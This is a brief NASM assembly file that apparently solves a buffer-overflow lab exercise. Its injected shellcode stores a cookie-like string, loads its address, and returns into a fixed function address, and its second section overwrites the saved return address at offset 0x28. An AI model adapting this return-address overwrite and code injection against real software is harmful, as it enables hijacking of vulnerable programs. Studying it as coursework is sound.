bits 64

section shellcode start=0h vstart=5561DC78h
shellcode_start:
    mov rax, 6166373939623935h
    mov qword [str], rax
    xor eax, eax
    mov byte [str+8], al
    mov edi, str
    push qword 4018FAh
    ret
    ; times 0 db ' ' ; 0x0 is also valid in file input

section ret_addr start=28h vstart=5561DC78h+28h
ret_addr:
    dq shellcode_start
str: ; str need to be in rsp+x
    resb 0h